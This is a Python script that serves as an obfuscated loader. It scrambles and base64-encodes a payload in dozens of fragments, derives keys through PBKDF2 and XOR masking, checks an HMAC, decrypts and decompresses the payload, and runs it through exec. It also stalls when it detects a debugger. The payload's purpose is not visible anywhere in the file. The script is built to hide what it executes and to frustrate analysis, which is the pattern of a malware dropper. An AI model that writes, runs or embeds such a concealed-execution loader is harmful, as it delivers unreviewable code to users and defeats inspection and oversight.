import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_bffdf9_0 = 'oL2iOwnPQn7ShrQt7QBmdGEUAopPKg6kxzRE9U8+'
_bffdf9_1 = 'GaFE4Xz4Ohru9XJkaSIkIz'
_bffdf9_2 = 'vB4P3JnLrCrfhi/+Om1lclmYzhc8DgBVEGmLBbPcs+CvftWND/jTQOx'
_bffdf9_3 = 'iGz4rfGWAfcu9YoUXMlO/k1gGORlZPwSXNebUTvR0xDAryJ4Jzaj4N'
_bffdf9_4 = 'HVGlOpIWsgO/DkPpV244Uge'
_bffdf9_5 = '21X50B3vvgq8Hw5Idqq+xN6k1jXQpUkQZRU4zc2EQQFI9VEWV0'
_bffdf9_6 = '5rpuIortLngA/l9PGi4GVAlYkNmgtuYyjG0NESActX2GchDAIACWOu+Aw71pMiJK'
_bffdf9_7 = '6kWye4DZv0x6mW8kCKqyyQYAJ4NGzepKYx5n/TlsvlzHmcdUqM'
_bffdf9_8 = '7cmPLHO1R3Nhmm1BdjrwF54tHwHpjc1anMOThkLofZUkBQOdYGH/DohYrcNGZa'
_bffdf9_9 = 'KokKft7YqSBcqMspG6GAaf1C3WjprceEZahS3m/ptYsgR4AYMmHSHVmDopKw1'
_bffdf9_10 = '8GlgiXfy12iJRaZfyDger3vjjSD'
_bffdf9_11 = 'q10hKPOhPJatGJ5pbhfpmA2OCwNs'
_bffdf9_12 = 'GVN1W5/Vq31qKqDcCuFNmEs3L71u+JROIMhiV6GfA2TtlGMOdq9jx7VV'
_bffdf9_13 = 'OTVkIy6E40tFBWQxmJ/q76sVT6328q0IA+93t2DM8Zhpv+UckvkPut3v6s8+AkMu'
_bffdf9_14 = '/YO22nffQ+kq4cJfgueT4UdJJ9/Ufv45KwPKPa65l1XQu'
_bffdf9_15 = 'DmBS7sxj2voiCrhzjcjJxqpD4kpa0T6g58QVbgjRBeFe0foAkFd41iA608Z'
_bffdf9_16 = 'KTxv9XGQV5Jwt0giyuHeWSX4Sea5iwEP3/tFpQ+NTZIm'
_bffdf9_17 = 'redcUyQIYgoIDcSG3/hX'
_bffdf9_18 = 'FMEwODpjxwz5phf97wgGcAaxXWuH'
_bffdf9_19 = 'Bmyzf2xbc7gDkW115qN/HnQtQr3KW9I7K5bVh05UX'
_bffdf9_20 = 'prDsNzJQZPks+FenQ8FX+4Md2i7tYtC1+pc'
_bffdf9_21 = 'OYIMNw01/b//dZB02QjYP/anRY'
_bffdf9_22 = 'OV460pPzHw2fC2rrWxjp0QrQA89X0q6eFtrIEGSOyi'
_bffdf9_23 = 'KlzuHF284vvql5S5QYlnXCjqvm6YMO42'
_bffdf9_24 = 'd4A8c4xzsqwYBVUJhhJwch+Fxa5VnVUig9sIJDhO+hO2D+XGQYUM'
_bffdf9_25 = 'D4xU9jL3yjd2akMmN+t9rkaGIUsNatglp5se5bLip7fc65'
_bffdf9_26 = 'NoPieCoUUPrtffZtAroIaqIbOBtNqB4URwjnBHCV0Bnni'
_bffdf9_27 = 'U/IIG9L5sfn9NSL3N3SdrR3'
_bffdf9_28 = 'mYUI6ziuYYXCi4COQhzjtcJb16PoUBT2'
_bffdf9_29 = 'E9YsZbZj5fz8sGDwdXvytMwcARvJWNIWbvT'
_bffdf9_30 = 'wowapeWAlfUGr0mTHYKTO8D'
_bffdf9_31 = 'ZbNpL6527W46OY3inXxq2FlVXO1L6/H/icPWfbu6dGR9y5m'
_bffdf9_32 = 'TS84sEYTqCKUdtXiVDtUOQupRy'
_bffdf9_33 = 'LTivJugPSuiBia5I3sdI1Eud64FcmCqq5bWMT8uUHxeSz8B80rjcliYSRr'
_bffdf9_34 = 'fG8uih+p2sDnSpNp'
_bffdf9_35 = 'FiuSV2I/1hxNgCDCKuSsaFN2ElYQKsUT2s'
_bffdf9_36 = '8wWLUvIbZBQE8ZWYc3gg+nz'
_pls = [_bffdf9_0, _bffdf9_1, _bffdf9_2, _bffdf9_3, _bffdf9_4, _bffdf9_5, _bffdf9_6, _bffdf9_7, _bffdf9_8, _bffdf9_9, _bffdf9_10, _bffdf9_11, _bffdf9_12, _bffdf9_13, _bffdf9_14, _bffdf9_15, _bffdf9_16, _bffdf9_17, _bffdf9_18, _bffdf9_19, _bffdf9_20, _bffdf9_21, _bffdf9_22, _bffdf9_23, _bffdf9_24, _bffdf9_25, _bffdf9_26, _bffdf9_27, _bffdf9_28, _bffdf9_29, _bffdf9_30, _bffdf9_31, _bffdf9_32, _bffdf9_33, _bffdf9_34, _bffdf9_35, _bffdf9_36]
_2672a7 = [(19958,13516,2),(30010,11912,2),(35571,13885,2),(52838,319,2),(59297,5628,2),(928,6995,2),(23770,4449,2),(2885,47328,2),(45977,2599,2),(12539,23079,2),(14958,63203,2),(60402,44668,2),(8830,9588,2),(16296,38692,2),(23363,30606,2),(38500,61284,2),(0,0,0),(0,0,0)]
_e761f4 = 'eTpbsg=='
_bd9865 = '0VzcnqCIwpBQwvFj'
_aa10f2 = 'D38uR3RgVuc='
_9d508f = [19, 17, 27, 16, 34, 24, 8, 32, 26, 4, 12, 7, 0, 5, 33, 3, 11, 10, 15, 13, 28, 25, 29, 18, 21, 23, 9, 6, 30, 31, 14, 20, 35, 22, 36, 2, 1]
_salt = base64.b64decode(_aa10f2)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _9d508f
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_f1a239 = base64.b64decode(_assembled)
_e59328 = 32
_be31dd = _f1a239[:-_e59328]
_e59328 = _f1a239[-_e59328:]
_fbe765 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_2672a7)
_hdr = base64.b64decode(_e761f4)
_nonce = base64.b64decode(_bd9865)
_km_seed = hashlib.sha256(_fbe765 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _be31dd, hashlib.sha256).digest()
if _calc_tag != _e59328:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_be31dd)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_be31dd, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_7065ed'] = mmap
globals()['_bd20a0'] = lambda i: globals()['_7065ed'][str(i)]
_x = globals()['_bd20a0']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
